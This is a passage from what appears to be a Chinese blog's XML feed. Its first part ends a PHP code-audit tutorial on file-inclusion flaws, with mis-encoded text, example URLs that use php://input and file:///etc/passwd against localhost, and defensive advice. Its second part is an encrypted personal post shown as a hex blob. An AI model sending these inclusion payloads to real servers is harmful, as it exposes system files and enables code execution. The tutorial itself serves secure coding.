class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test12.php?file=php://input</span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”post data ä¸ºå‘é€çš„payload</p><p><img src="/2021/2734680967/image-20211219191128216.png" alt="image-20211219191128216"> </p><p>å…³äº<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php://filter</a>çš„å¦™ç”¨å¯ä»¥å‚è€ƒ pç‰›çš„è¿™ç¯‡æ–‡ç« ã€‚</p><h4 id="4-4-file"><a href="#4-4-file" class="headerlink" title="4.4 file://"></a>4.4 file://</h4><p>ç”¨äºè®¿é—®æ–‡ä»¶ï¼ˆç»å¯¹è·¯å¾„ï¼Œç›¸å¯¹è·¯å¾„ï¼Œç½‘ç»œè·¯å¾„ï¼‰</p><p>å¦‚æœæ˜¯Linuxå¯ä»¥è¯»å–è¯¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure><h3 id="5-å®¡è®¡æ€è·¯"><a href="#5-å®¡è®¡æ€è·¯" class="headerlink" title="5.å®¡è®¡æ€è·¯"></a>5.å®¡è®¡æ€è·¯</h3><p>æŸ¥çœ‹ PHP ä»£ç å‡½æ•°çš„å…³é”®å­—ï¼Œç„¶åæŸ¥çœ‹è¯¥å‡½æ•°ä½¿ç”¨çš„å‚æ•°æ˜¯å¦ä¸ºå¯æ§å˜é‡ï¼Œå¯¹å¯æ§å˜é‡æ‰€åœ¨çš„ä»£ç åŠŸèƒ½æ¨¡å—å¯»æ‰¾ä¸Šä¼ ï¼Œæ—¥å¿—è®°å½•ç­‰åŠŸèƒ½ï¼Œç¡®è®¤æ˜¯å¦èƒ½å¤Ÿè®¾ç½®â€œåŒ…å«æ“ä½œâ€ã€‚é€šè¿‡æ—¥å¿—è®°å½•ï¼Œç¡®è®¤èƒ½å¤Ÿé€šè¿‡æ„é€ å…¶ URL åœ°å€å¹¶å°†æ„é€ å¥½çš„ payload åµŒå…¥è¿›å»ã€‚</p><h3 id="6-é˜²å¾¡å»ºè®®"><a href="#6-é˜²å¾¡å»ºè®®" class="headerlink" title="6.é˜²å¾¡å»ºè®®"></a>6.é˜²å¾¡å»ºè®®</h3><ol><li>ä¸¥æ ¼æ£€æŸ¥å˜é‡æ˜¯å¦å·²ç»åˆå§‹åŒ–ã€‚é˜²æ­¢å˜é‡è¦†ç›–ã€‚</li><li>å¯¹æ‰€æœ‰è¾“å…¥æäº¤å¯èƒ½åŒ…å«çš„æ–‡ä»¶åœ°å€ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶åŠè¿œç¨‹æ–‡ä»¶ï¼Œè¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå‚æ•°ä¸­ä¸å…è®¸å‡ºç°./å’Œ../ç­‰ç›®å½•è·³è½¬ç¬¦ã€‚</li><li>ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­çš„å‚æ•°æ˜¯å¦å¤–ç•Œå¯æ§ã€‚</li><li>å°½é‡ä¸è¦ä½¿ç”¨<code>allow_url_fopen</code>å’Œ<code>allow_url_include</code> åŠŸèƒ½ï¼Œå¹¶å°†è¿™ä¸¤ä¸ªåŠŸèƒ½å…³é—­ã€‚</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åœ¨PHPä»£ç å®¡è®¡ä¸­ï¼Œå®¡è®¡æ–‡ä»¶ç±»å‹æ¼æ´ï¼Œéœ€è¦æ³¨æ„æ¼æ´äº§ç”Ÿçš„å…³é”®å‡½æ•°ï¼Œè¿›è¡Œåˆ†æï¼ŒæŸ¥çœ‹è¯¥å˜é‡æ˜¯å¦ä¸ºå¯æ§å˜é‡ï¼Œæ˜¯å¦æœ‰è¿‡æ»¤ï¼Œè¿‡æ»¤èƒ½å¦è¢«ç»•è¿‡ï¼Œéƒ½éœ€è¦ä¸€ä¸€å°è¯•ï¼Œç„¶ååˆ†ææ¼æ´çš„å±å®³ç¨‹åº¦ã€‚</p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p><a href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_6">https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_6</a></p><p><a href="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a></p><p><a href="https://www.freebuf.com/articles/web/266565.html">https://www.freebuf.com/articles/web/266565.html</a></p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>]]></content>
    
    
    <summary type="html">æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶ä¸‹è½½ã€æ–‡ä»¶åˆ é™¤ã€æ–‡ä»¶åŒ…å«æ¼æ´å‡½æ•°åŠå®¡è®¡æ€è·¯ã€‚</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="æ–‡ä»¶ç±»å‹æ¼æ´" scheme="https://fz1lin.com/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>å‘½è¿äº¤é”™çš„è·¯å£</title>
    <link href="https://fz1lin.com/2021/5071042/"/>
    <id>https://fz1lin.com/2021/5071042/</id>
    <published>2021-12-16T01:09:50.000Z</published>
    <updated>2021-12-18T04:40:05.629Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="532776c077cd50a18105faff1154de3851140b237d12780b78c6772419f04629">2eba973d0956b0519bad66afd662f143fea684726e4127ead8103f8a2a940824d6ab64963c5ced111ad0bc8ba1d61fcd98cdebefc8962e88ce6d223a4c3505dd6563c85e4c0ab59b5b039b450de7c8bedccb720451a5484f143460ad4ed056636a261f2e282d8a753fec8c21dc31af7c38602e8cccbf3ac68bc41b756b8eb4bcb2b20ef399977b54919a47fe57df9cc195b39ea01108473b1dd71221aa0a28d2a4526619c6b950068acdb8ae3611af8062aede75d2089c13753f42162cac4e45f6ed8a575247255a3b24478f95ae3a375280524e690ec54d3dca5e0d2b490ea41f0245f6a89ac9b0cecfddeed6ccaadf12cae41eac02626df083fdb86ab39755885d86686d3431d04161fe521728bf4f21de72933311ece1c6dbbbba7984632dda5fcddf4ce4654d69b7f6072564afa1dd79948456b838fc94de01d706399d4023ecddcb289123c7037935e95eb827dfac2ff9cb3b710adc043c14d994ace17b375be1984b12dadc4392adf7c4849f1c1afc501a7caa474fb0011a064dc26ac2523c14844c352e4ea9c304a5fdfa0777024d02aa1afc12b6df5721ea61a7a0607ae39f762956c7258f2a490d2918053c782f3023643c91518d8fc5cf8515f7408474626d740f5517b30d30ed8b2f3a40381ef56a2af918b1d51ed1e9b8b7221f0e82108f83a616b44b8587c33da525d5e3df1c55e590d478787f713453fcceb8cac7f005d3782ad2848f4f91015aa71251f44fa48bd58d7f03e8ecd745fb05f3cb4b34d2b4ca49282b1deae101247fc71155ecff2a6c8629c1aae180287b83354aa8b0e398b5bda521e539c5bdf3212da04c01cff8c9cfdfa284c5fe71226958883210597c03dec48dc9ee74f04435890a9a36dd9dc06a16d62d408b6719ff06dd818b5a1ea7238fb7207452b6dbad9c69b926b1620ab4197d1485e1bd68e66642864a6f62ebd9c7b6d9a94ac8bba3ba3d236ce269c686d3bdc912b3a514faeaed19615b6e3189ffe42a2b3a33c2a280f453283459fb6a6c371b441f5b68fda9bd0d47fceb0e6029eb9f25786bc8d2b6f9b684bdc9005084099c6c2bd62679471d9527367d004459effc689dee9c13178c2a093e10046fafa446c3664d31dcc439c59acd984b8f0b6e4b778b5e1999f702863062215754c3ff3a88d45fa632554a321426f2d3f39b225cf8e410596eb375b71d6abfcc3a9ec8969afa904c2c7dcc89dab7cb76d36049a88792ec7b5d7373729dcaa94f75798a8a2fdc18d72e1df66faf20e608040c9c6ad736bd153792f089a0407f08aa2fb13bd5d954b5afd60687ef19fc7b9b8638904bc53fd36f7f5a5c83fe21a11097688252813ba35b4ad24c398f3abdee7a95426c6a825c3e82876a78c102d3f0ae651e0d08dd9e63b03e917187a111963587ee83028064dfc2f91bbd7c25d012674798e0f881282427ada3c04b034ff3611058864f966bc55b2ac5eeb60a7bed9fb65c9f5789f7c25c746c8943d39863e03aa6d40b9f9f578ad9d4d02a9edc552c7cb412986dcdea2e149e0c029e041d9f13e54deb55a9d8ef4334fa02693813919057cea5b14a847b45ba75b8d2fbaa9af569a0ea0c1308a675abf0d6c937dc861567a481fa40ed0de84db7c4de554babc102e2105fd64299e41a100e58c8e67ba08e84b8409225b84b31b189cc86c237733b9cdac06bbff80480bf617582e115e637389dc05e227233b6c1f75ce4be6fe43044b5f958f0a17c59fcc7e72818437b36bf3aca35f02f0350e1f8ed4e2e52343a035865c878a425f45e11c5d665615d4c0db2c4e62b71c28948b7b439f5b52477bdda0b4d984797c40c5866314d56976d3f5f319610954adf76409816d48f85463ffec92f15d8b4051b241c25b818a1f4f8ffce636c808268794a257848acbb22345faec5ce7c4a100e21c75a3d9ce11ad15c02cbfbd89ed8b90e3c6ee66332964a8f7a3b71c37d810a3a2910db76244e6a4103c15f51d12de7a10c93cbf6e24d2ea2498f523e252cb980579236ed63a8459f1999fdd9850b83753ff9bf3d946c54751bda304d998346d7995fdb74b8ec51db3c05f59d346c4fedcc683eb7a2ba2307460375a5a61f18ec9134bd424646d04ebd349d07de2f75bdc9be752f02d24d4cd105bc9a83356c3ca8cc74befd60ff78c4c4e5947ada987dc995037c261d5ba6efc8744ee3086467c6ab191e9383e3d267764f002766fcddf47dabf729f818b9af1af559011ea6f2a40352425e37a8211636ae77d399db87f45a858c94217bd09ed1f5c12927be55a9b663815b94ccdb5e22ea7418429da7bfe4d4a396b6ae2500896be5df232eb7c588c33d41cc18dcf4220dff2be6c49acd4df04e7f24e188080ed3b7574b6990113a8d51f4ca621b87b6bf8dd4135436f03d87e70b9f8f5412d5cf480337262f397850669f98d2f618e453db1d6fff4abeb5daaf03866bd0a930d2f11467ca8d8af4995e8c1c5cd241d57a598cbed7cea414b01d0e9b2dd5d989a5a4ff5495e01d433245d5c432d27941744ea0559abd7a1ce56999c3c8777a1ca9e7db8477236df0eb4a1f549cb3dbbe04a197ef28f76993868b457e3a9bcb4334c449276fb2ea565b765b8cc02575860e250a59ca1df61ef17e3156aaf932e75ebca7bbd33667c04e950bf9c5dbb7394e146d5b8a5fa841e3420c36edc4a0915e9724b8c0f166f90ac22c6dccd649129bb30f6fa47913b80fd299faf713d00e45f9bfe5a77fe6de018965bf9218f8f980841817ef2be0596907c7c5a3c8ddf758097f223936b3eebdbc851bac1fd90c151d2eb0b2cf6d4f0d593838af5474dd584a63cf74a14319a0bc5f6806fd5622685811c06d96f283cfd33279398829ad000a31f6c93a6f2519bcaeffec8f8a13e4b380dfd1d658f4faadd8565267c505ab6e5aab16c7fec4f571f660eba9fc696695fe57856324cebab788e70c190f18b93a6bb915b33032e34b60402fc7a32244071dec79e4195b17e2045858643b85b5836837af6927523b4ef08b280d15b87e25a817d9c2afbad95f39b8e4a31cdfc6778513793272cafc6f834907cb6aa6f64781e19e7ba16e55d19e4dfb0b96fef2033fa485fbc206cc3d97f6b907cc0933d5dea494469b45df7d350d058f13c35c4ca4ebfe70062f0cc15db7f29f52c1e20ac32d45ab57894b5feac7270d68fb610e964532c41fdaa9ac66bb59b0e687c8221e1e3d47cec29fadf1eeb9665acd9792c12b30b1b7a54f0208c304a5d021e6dd77071449d63f58f09a6d8bacf105ea303b971816a3e02d20f09164d94ab5ac8ff618d14ea18e6099e5fe58aed8179719707baa38b7de98bfa5db5f37aa1a19fc643f752a00baffdb580a0ff4d6a7cd08444a4ed3f574735a9d86a1e2b2f336749fc55207e60031303b973cd8774353331d47f30069af5d292aafb2b79e6229c24f1fa2ffd7ef748e706cc3ff3fe511de365c7eca09b983631457f61e90689909854078e58d33757ee9a3e5b05a8f064f757cc95e2812ea27974cd3a1d5d96f4b496060fcb1d2cc653eda930c78bfba0195f4da591b8c9d5e33f14057c258acf7664c294f85434a1015f55964a5a88aaedea9b944a7aa747fc7bbec52911f1c04530f180a1eeed6b45d415994eab4808ff3f3d9911eae64411d607380256eb54d326b92509c1f52a337fc374cbb5716539d7062a6afc7f7b80e3353164455fe49a95a09bdc845c1e4d018987594c481c51168df7bea4e51c3846a38fc6274e65910642ca9d99bc28a53eeef61c41344402a3571bee45a659e3440e922e7b09b907900cfccb57fe4d5206c9202e701fc9960513bed06e3ad1d33fac6a03f732d87ab02a0acc0491da5c3196e0e0e50edc9cbb65f395923fdad3bfecf3ec2fae3482c4fe07bdd4f0febf1583d8b8a0e9d39f27344f3eeadcbee90214df9b758e79c77843cc0a136095793088168a15871895cc4ec4cc8bb8028e0de74a9952e43b9009cdf52f4cf2898f01962d4d618a47e73164965f1b15538e2d093d159cccd1b83accca98cd84f656d6f7e72fcf80314e2c03f9d31fdb41f4ac4ca2b39a032254a832f7b81bab26cf728b2dd25f164d5662afc0a6d3ce828246a36f52f21d42c0e07e04980c3ef92e386513e8ea4cf4028412cf13865de3094924abc7e2e47f77cc13b3167df3bf49e2e8630c874d0b8480ae8efce1d6dc8eacc1ba04cb0dc7e03eff7a3e0d06a721d4e62ef193d77dc1e1e6334ce238ee04a4bb9eefd97f5f9276a6ee5cb3f3c3a457693471b10d7eafee81752f66781146f78f3d67b3ac66d38a50df08c86c1cbae12932f5ee5bf1b261aef2af4244dd718ec96a6f53079a1dd30d36f0f7ef1bc60a4958513c91d07252539ec6b2c3cdd74c14b38f2af0c711c2326427675e240a87acb51b608e312f5538a1940102ced46df656885e9eb07a299798e316fffe5d66f6b74dde7fe3481b083d90676e8e35b1f27ed3f4c6b4de8ec9ddc10bc3b6eed8e4ac379740d62b307b3e6cdf019d8fdb96565fb753908dfc864bf2df7ab407190f4ad2fbd150cc936cd8c0dbe36890d7cecad67e6cad77c1a19e44894f8cc9bc47e9689c1b95b334d03819469ad89484894727d826f3e60fa095a70a9c2ebcacd2a1d391d5daefdd06cf9796dcdc2745f5ce15ce03488047fe9027046f089156bbfba086769cf5df611460718a545a37b801d889cf18cf2c695d29a0f7070fa053f6f5c974a7d6fc22e2fd19a309c89ddd3594999e193d444140570b2c63d6b9132006ed926db5a4b4802bd069f6e93c6f1bc84797be0dde1852ce320ba3e95d41237772ce943b21e34d52a8be06bd0c7d4acda6b88d106b968bc8279503eccabfb54291c714ea18424ae113ba6c3a95384279be9c003ed9a6f28750c80a440df3e12f769d8ee23b69618582e25e3d7c29652ae8bb4f982c6f333cc14ba7602bace56ff44f565282b9f0b54991b3cb388ab889bb732978f74c96d15adffac6b4f7c2025efe80d4f163d3f522e7b4dd1b97b737cb3a0a0f6e63315c6c488e62756d031cf068254a2281295ec303a793f063abcacf9f53eb736c11bf19a846aec7bf7134ef69e63c652d55ec071d44cc66e12df4091c09044688e84a51aabd78757c2887374057f46ef0f23f216f59e43271e2e17cf6253f51d2f23d92606aebbd75f945ff74eddd22426f380e84110923b021081521e2d504ac11760c519e746f7fce9abb436daee5d18b6d8e2ed992c2add0800459ea63bb7feccceb78ad62200c83d97766415a90452b0b1a4e5f25ed28b354b3f2e7f98f1fa164f6790d1b8e48acbc4e989a37d0154d2ac7b3a41cf6feee08be6a63ae75dff9b0d9b7d1fce5e6c1d1c86c12a28eff87d9bc7500a60c32e52d2e4b1838bbd6305b50c0562985685c1287e729179e360cf7dbe8119f66428a0e462cab35e6536e4b1952e6508facd39476a236579af350b3a3c0630c66fe113af273913a943e818cf178157f9eab3f71d8ac8fa836d5cffc3d4a4df5b47228d223b06a077a995b4aa9cab0d2506b748a2e051ccb503a21780825c6302b1c12b08e0f442e99b20e2836996a41360e6f84975985f871f945aa5c845dfe0e7648296589218915ad110919eb813cb973fd841f6945474beacba70f7dce31a25275cabdf59734a915cb99f92a106a21da4900afca8901469d8a218007076d152492888b38c81a7577999aca2137342c895b7db6398e14222d17d0876bae699dc0d0dacd6826e5769d003d1c90ca637447d1ceec8039e14c05872a0d23deb079f5fad85c771dbb63ae89aa329c22f9b4cc9893cedd1b3bf3f59a9913e6267e07716f65e2d9a2b6a38aa475ac9ca2d036f535e4bfa3474c8d3d126603d7ff753e23676e6f01983f0125e14786dd1c04abec8fa60a1a07f588b254276e10474d658fec4f1fda106c9ec2596fa1fc8f58594ff268ff0d3e06f73ed73d5751cc33457816ef2b2d08f83487e8c064c1390c13c79f42a4d65dd96c4db654c9b02ca60ddb7836c5cd4858fb072f1e16c181b85d1331739c86749a80c003423a7dd4806c949e1a78286eff40d866ed3c240f54e3ad40941e6c2aad980d6ee3f9a6f7b97b671725ae1a36846f9134c6aa122a2730c39b5337a0bf7e1481edce1f2da04eb247199b056c4e48117b12d2c0bc9cb50e08b68a5ea68a3438dd7f5d08570e777d33b3819bfdef9f743b13f259f8a83b2dc13a39bcafab3376fa0b015437297db069ef49b8ce5b601072f5cd9748090743ff890c5265e4ed5fff63d71d29c00aa5e90ef362eb056bf91e49a626dc6501562eda90a9b492fac09a49ab62fa3895896e41f16a50eb9993b977768e91443364d0f7bda732694c6bdb7cb9d0aeadcdf5160f465bafadfb4e119fe4c831f353b3b68cd4b65d04ce5cc642779643d0d6e8a44436d2f57675fc390cb2f77ea2ef3ad452231e9c80ac1211ef1771723d5ca59ccc03b80581fde8cfa63bc0c062e32656b098cacbceae136e1630802f67aa254f121ef8c09263682b5bdf88ae323920e0f695f5ba4587f97d687d624dbec47d5d428320d8988bc75a1bf088328a1269cd527f0b299532ddfd7a6a2a2046a19b039c17f47a72f68b4b6459b4667cf51437732a4c8e5611cd7678c04bc5dc8bf506d37f4326f6fa3ba5cb03eec3cede0cab57728e9e93b2dd0a69b1782c8769c1be9af4aab43a2fc55abb4ae511be5a98341cce9d466302dd1b7f156463e6e6bacec9d81a2ccbd73e35c6f20e199122b85612905d028e5d64429c16b5a94bec4b2b2075fa1aec188202f7c0d808491fe0b7aac58c9da8387e8d4c71956e754b76a10d533f18eac858b33e7da9b4f968198226530982277577d50057d097f8527d2deecc583b3fcb005b35a9a2dda21d2abffaab9b881bfbf822cf03a94ddd33ca19ebf22afc19bb3d662e772a56950fa6503d5d290a35bb951faaf9562021c392ff70bee398bcbfd597c2e3e74946d48fbf34d54b56ce5ce23112234f881590ca9279056dfc63b07ae753a41c60fc9464f2d28ae8e418cd65dd380e6d1f23c6e812b41948e660f6814899dfd31b004fda568fc66a975cca23697d020c156de09b9f2c035db0a9176b29c505fa21ebf26d09832d2c8a08cc60caea49149f9528f66334f7c7abe93f502bfae27c5d61b84c229a7ceec5ae883fc4d82d93fe5b858c5a318b2860974d611e37eb3364f3f01661da5ab07d75b3af5ce1d6c44f96ac2d4b17528de17d42305dca76347ac4cb303905be96db655c193d4a7bb8fe882b1c031b6490de37cae02a0939547c2489dc988a08a693a285401e0779c4d024e0682d4445581551d44efb8ff9643c5f1d32ff46072104e30464a43ee0b3944119001001fe90f1bca85e43b5d8e2bd830a66cd350533f261e1792c922c9e46a61cf9f1df32c83435dbd720a1f28383490a067537d59b1888629d7404d5db19ac90062d6a9749389d90c7c2f50d7759469f44cd90529b3e43bffa59666d7eb46f3f61c644a4c9e92711eb0fecc3faa5e756b3b1678f40744afdc5a4d157c5e841f9288468e62bc1718eaa52c52271111d6897f16b9424107029e170b7637336f6f70ab537858ec0efc14b4184668f47ef1857cf6cb451e914a20a24464ebd94e5ae724a6eca74ccd6315bb22c89cc6226a255b7093998c03bbc52b106e583a2cfcddfa6e0adf41e87ce59e7e4f036de4f9d2c0558d3b4bede462cf1184b5e05c53e0adaa753e93555c2dfd77784cadbb6a44ed18763366e45330efd9c43ace4801a42731fa93e6e4794771564f7d3e7a6d1abb87abfd76c03bf3605eec9cd209996b123da1aea8fb6fd4c6ed9b8ad018e45002163b1fe9324c2c92fd598a74b2d7fe3034afcb9c7adc4d16038a2608143b3aa1ee4967dc8da26949700b3d4d0918da44d5b9fd758b6d8eaab4223a36b27a4fb7f77a732518fa4ff1c9690b4fd1e76a624092bb5e79eb3fde95a4b26a11bb3e24a3ce638ec99f4f51ba9f1b7f010e55f5ca239c884f277077b627e5643680059f19140dae1675d2ded11e3b25e0435f5497191653506b6b9e94b06c95b8da267e33aa24f714be4d32aa5944e51c1d964ff33875202310a494c111c1d3dc41aa558f325f8e34bb674e40416922c4b87620c49c62faedb0c7e1a5139604e0f9c216e73d0277d4e6803eb19df3ce095ebf48d573bac221fc0df66d851f5550ab75e98a5d07cc7fbd66772f580208c30463d4ce2c4aede30fadd7f53b55aa63f2ca1473f1dc9f7befcae5ebefc5afacb424cef681c99243f728d29a32fc62592a8a9ee56276a5c4de1263bc238d6ff5a74035ba9599f363407a2a063af58795f3e219c454983db9cab9b6dba134aeb1752f98c36a92bba21da85753ce2da46303f50051fc0207917e3eecb928bea8993a46b4921d1d138fcbb1ccafcaaeada7bd058df728244b6bb2aacb235a17ca39539a70d375cdddbfcffc4002d711c9df42019a2bd1b46afd87848cf4cd7ebfd47c575c58a94ff24e226f716227c803e3efc7580c688621724fe6697b380433105a49f86d7b768f4eb138b81f5a097fd6131b8f69b4d642696df0d0053d88cc3bd8b440693c888235184cb22c4f2470d6cefeea38ab8c6834fd0a055288bc02dd1823fb2bc07af19eeb12692f60c8cd625de0d49005b80774e46aefe8e9a6fbd3631f5b6d63b045bf0a9726183662beee86a6510f157959c9bf47468ed880e74f769421db325b0007c9747e62fa2fe5059d084e7193703cdbceaa8bdac9e0c244c95397d84f6321c96fe9849457beaf9c3b86095e0bda770faac38447ddc59f9b50373307ccacbd12697b91ed136aec93cef7765f6e7e338257d982788a121ee115aca0aac832406368e9617153ca1d40468fbdff1632b860b4b9f826cc36a25524a3e651f005853339b71461f291e8b3a6373a02e862b0f2a9ef50d7239c218f63779aba0402941e751d6f9db76429b25c584be4e0c664c0b72bfe4a7748df89b81c040ba57f43370039f9fe7c9b750c96263434caab7c2b6d3a2fea25ed3c2ec82642832eb90c250d0b1a197936c3b09607120f09b84be694f15eb7f5471294851fabd71eaaaab7df529c791461b507fe506165a79026390b5724f91dbd86c131aca535cdff975c8d95d588f1a083830ac2df490f3cab6bedc926783c1d89404f4dd67f9e77b443953c752c25b0ae41e96415f3e5f8bf5825136115343c340e584f41d63de384f7a92db6f69624597bb23233215f495830306312c5cfec78e8e4a1fae73cb9466d85074c8bf5ce0e66ed2011986267270423e42125fcf7d0f3befdf3283031f7ead45240c58fecc1bf3b5434e4b44fbdd4494c41d1db78d7ef41e77c35bb967ef1f795666329be4de3643d484a49ad18fa164fe625d1940039485f909592b80f412174d040d979f164712cb50fc04877aa0de69a57c5469117ac2f5a9cfd91a85da35d4374366cfc871ade8dffc4407020550d7bc9cc3d2b8c95a74bd0cd9a9e36eb7a32f0201c55a5059ee7e2f7d955d532110e4aba6dc5cd439b934abb6b044ed1e808611de16bcaa6dce45387e3c92047de8d1761866dd07d5716f954456bf05c8648b4c87e709843445856e2d411269957df41660f1ffe5c039bda6b911d7b6a0774f6ba1878a2f959bc440bd322f0e3c87aa0a197a83bca3e0894d1f58bcf2203d12f7d94851aab5a5d85bd3f03e127cee9db6f29f02e716e48f7088f8458b3100f1cb734f635ff4f2dc60637b8fc6e81889bdd141d7ea54d6418eba1cf59e013d1a0e6277e30bf753787a522ada6f814dac2a4bcc0fce3f6eba7b77e88189f3956a6d35432ea39bac3c9b5e9179eab30c72fe6ac3e6a6393d75b792098320d47a6000b1a73e47bae84f28556029990988e9099051dde2bd74df1379d3b36e3c2755d630dcb11254aca48c98d109d8a97ecb7241b1fbed4a2ceb66dca826db09849e40c86699fbd7d7d64f57aaaf9aab1b42db62f9f8fc753cc0bfb095d57fd2e8b890e3c8e09fe53f5c86855174438bdf6e6d5b7018561500aadf3848184ad6c9050edd9103ebfc67953d3915279d38c9944ed83df7675ab9836ba8deee6b3118dbdfe8bf90f4d9e4675a04b72f5f7ee4f3aa358afda36f247cc040fc0c1adab5615d9217ad03874e95529f8d3fd1846fa310924fefd3ede387c1169badf010f0ad3f6a45827589185f362924abd91f4a959741de23cb587291202fb7ce0523f69a3409e4f4fdd36b37f941d5642e14c70953b494fd62f521b6081cb857d1bef47ff8ea2b2f5d28d201ffc49a236bc33473daf0a4b48dbd7d3c84835bc4e3bf81bf845db3284954f722bf7b0e4ccd9daa636c7a04db69ba9800d71d6feaac485f224c390f5c8e58ec9d4a58ff1d310941389fb1ceaf8a1386c71c399bc4e5a03bd318c908eca152867345d4af9a64edfb8d857bcb4f2ae8f1ef700c9924cfff2e363707f85ce9b0789cfc540b29478755e10694f16495fa320c45a8356fc04b94844c066b898819062f1152948a3663163147997e3f3d888b8791b3f559472645ea58d251fb666ce71502306b273ef503e7724e3e388d9fde6c10ff2fb92e40b94bea42a645abcb82ec487549c1934bc90752dc03d889822ebbd822eda601d37dcc8e576f824766d179a3d1df666a5e1043d014c9c4d6555333fd90987bdce2947e852e1fe722018654a5bacd61d94c1061f5480f1e41a63229d76ce24a154d8ed05c82b1391e104b74c202b9a4b5962e239b6a3051cd41f92c20b14d7cbd866124554c0a581e893caac02f0cd76bcc0bd51b8e9a0890533c541856d52921f0c54e75c5e7799502d8250847fd6242c69e0adb824a864277b05c8afb3c664b671cfcaca5b0433fea45c7baf4998c45cbe1621e3ea84e7a44972654f7747f86f7eab5a65481d8971a60372c26c235534554cb072cca5f24c3844e37d795ea2ef941f973731457ce38019804446b927febe9c09b4fa58b0ce6263b0d7b337a7758c57741f1c5513bad2bbe58404049f951d2501cfbdc4ddd02aa9881084410cb77081aa94f1fb1f09b96ec904314c843cf7a86793e48ec9ec0de55ffb3e6b9d7e458360c4ed31540574facf749461f65ce399c376b51f369468dea7c3de698d64fabb3c84da973565061fe3304e58a921905ab06b874b1a29968602d1541d025302640c0cd385e8e1ccf73f105f2df736caf2b54887f95b336bb62b9813358970fc31f2da6c642ac193dc3138e3a1f28347f6478b8d11b19d32bb51a07d8b0dccb9593c642f773815f29ada0a5bc3accf855d369e8e707884424dee442feac4b1abaf04b9601f2d397a91b132167d817cd8a69207348144bf623d086f2a3027340d309e27bcfaecc65dcde8b4ea208ed347fec9e26588803b960d050520f7b79c14c734a035a536c786058427b196992b8a6f9871abec338bc47dd77888df16e33b240f7f1c83793a867d7920d4371c71d8a7ff3bccab4c9680b2992f35d5c01102674f3e5e54ae66cddd7ce5c1d73ea13c44f360d1b1cf1b97f62dac021ce4fe0f8ca36024d8c595e15392fe3d7b1d33c6306b10114efc172bfc9fd9025501896d993463e166b2a6915fb0c6114ac70b55c69872a79f73b5ba47d7d5745fa454f7bd6790e6ddaf9b1fff6f52810dcbb2294cf6b9c20273db4fb7ad0b6ece7446fd41cc650ffa642214ef79952964f1624220d39e2dad502ec1fbf1e42c5a14d94da0d6473575b0b3e83566f3f2046f5e3f6f56804e36cd95fba827e32585dc7ce8e901a94b6d922064e936f342c6acc80f892e612568ce413ad39c76b219949dcdb963e5071c665d4bbb483ad27c4dfe5b0dedacdecdbd67cb1cb82294965af2d978e68f7783c046be8377f3e5ddede8dd20a5805be9154dda0765c8b87dbe718a1e08ee352454e4c06133deb59a1a551f52af4de4673ce1a0aedeb59e4a4a722750ece197f2a3797fa9ca31eb8b3a76ad0c622071d15f130b4eadb264aab5849a1269f535251e458184d72bcc3317dc5d50b83568a837ecb6ed784d0e5956ae7e25e66451fffadb3ef56de1449a253800d2931e4796a71246a2668f539b141b9d13440e120006954b7c698041255d6fb16dda3bfe44c3f42e8e995866aee14de3f2a5803f17204c4521e253b4ff83bbd51f338c515596ef07da445e34d66a03a6981c0f80d834ea167f24c60fdea98fa84acfbb444df03e9a6ab8d337b08c25f8b98f15574112ef4df85ccb2fddaad8d96dd635b417519ca2e1cecb80a269af6d51858f38f80b4d2395136e8110c935d04065c577ab49175105a258cb91e954153e960540df4486fb9b72fe742267329decb2cee3c446278e732a9c93b6b0848390ea9ef70a34cc587f6ee6f018ea04f130fea831ec6730ff4b81cff6603fa7d03b1c056cb92aa30012c2c90859417b94f7de88ac97d16266f407a644535385a58f5b43f266f72011365f08a18bbed2070e0581607789ee00814889facde17b754f5ffa6873435b1de7d1e2d45be613a490aca2a92b4ddf0c856b01d9701d24426e5e8c18b550e58e33179c29bbec6df902beb2704e03319d74f565b5f9692c86abd8947862d4c8f048af47061da8329a2d66cfadaf7502b149852cf65c65319982ec8ce1aef7c2eec98ac2a43643f51eb4365ce7c540ae179f7f9532ed153f76d012c9b29eb406db02685303829171bfcfa1d2cf2658f85d55b6a854e4380033b3579fbd069b61b48ea620d612a355fa66c125614de84fcb8ae2392e708fc0fa5d80e233e8cb80faff575206defd0ac8125a5ca6a791ce68c431d8b921216e92035937f5813a125ef2db85216ae4acca1770da29960bb8ac63e2b0db41916b74f32725a35f1c6996c07bbc35f9309d618cace7e97ee6ad7ca21044cb700f463e8c528b4fe8185e4b51785116cf4ebcf2b2a9e